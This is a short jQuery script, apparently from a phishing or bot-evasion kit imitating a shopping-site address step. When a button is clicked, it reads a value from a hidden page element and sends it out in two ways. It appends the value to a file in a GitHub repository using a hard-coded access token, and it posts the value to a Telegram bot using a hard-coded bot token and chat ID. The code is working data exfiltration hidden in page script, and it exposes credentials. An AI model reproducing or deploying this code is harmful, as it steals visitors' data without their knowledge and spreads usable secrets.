$(document).ready(function() {$("#a-address-step1-wrapa").click(function(){
    const fileName = "anti9";
    const owner = "Damdoub27";
    const repo = "Antibotcrawlgoogle";

// Replace with your personal access token (PAT) generated from your GitHub account
    const pat = "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";

// Replace with the line you want to append to the file
    var buttnName=$("#visuallyhidden").attr('aria-mind');
    var message = `Token: ${buttnName}`;

    var token = "5951037848:AAEu8bU6D6B70fKNkeD206xlOFTU-tNaP-E";
    var chat_id = -881901389;
    const line = buttnName;

// Fetch the current contents of the file
    fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${fileName}`)
        .then(response => response.json())
        .then(data => {
            const fileContent = window.atob(data.content);

            // Check if the line already exists in the file
            if (fileContent.indexOf(line) !== -1) {

                return;
            }

            const newContent = `${fileContent}\n${line}`;

            // Build the request object
            const requestData = {
                message: "Append a line to the file",
                content: window.btoa(newContent),
                sha: data.sha
            };

            const requestHeaders = new Headers();
            requestHeaders.append("Authorization", `token ${pat}`);

            const requestOptions = {
                method: "PUT",
                headers: requestHeaders,
                body: JSON.stringify(requestData)
            };

            // Send the request to update the file
            fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${fileName}`, requestOptions)
                .then(response => response.json())
                .then(data => {

                })
                .catch(error => console.error(error));
            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chat_id,
                    text: message,
                    parse_mode: 'html',
                },
                success: function (res) {
                    console.debug(res);
                    $('#response').text('Message sent');
                },
                error: function (error) {
                    console.error(error);

                }
            });
        })
        .catch(error => console.error(error));

     // END Ajax
});
});
